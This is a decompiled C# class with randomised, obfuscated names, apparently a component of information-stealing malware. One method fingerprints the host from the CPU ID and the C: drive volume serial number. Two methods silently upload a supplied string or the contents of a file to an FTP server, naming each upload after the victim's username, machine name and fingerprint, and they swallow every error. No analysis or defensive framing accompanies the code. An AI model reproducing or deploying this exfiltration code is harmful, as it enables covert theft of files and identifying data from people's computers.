using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace MufMaOSvGyvz;

internal sealed class MfnxCHhUwIjyzc
{
	public static string HHmRdTUQTZoj()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void qkCGSsikzw(string AYGEFRLByvvc = "URL", string bWHhiqLjYJjlJ = "USERNAME", string YOjlHhEIoQa = "ACCESO", string KYfRRhHmvJaq = "")
	{
		try
		{
			string text = HHmRdTUQTZoj();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(AYGEFRLByvvc + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(bWHhiqLjYJjlJ, YOjlHhEIoQa);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(KYfRRhHmvJaq);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void OahdOXOuXvYsd(string zxXgUOQaPMcjTwJ = "URL", string shCgxQKbpDrjP = "USERNAME", string BgGKwsKTzpt = "ACCESO", string LrnCoaPZsGSyiOc = "")
	{
		try
		{
			string text = HHmRdTUQTZoj();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(zxXgUOQaPMcjTwJ + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(shCgxQKbpDrjP, BgGKwsKTzpt);
			byte[] bytes;
			using (StreamReader streamReader = new StreamReader(LrnCoaPZsGSyiOc))
			{
				bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			}
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}
}
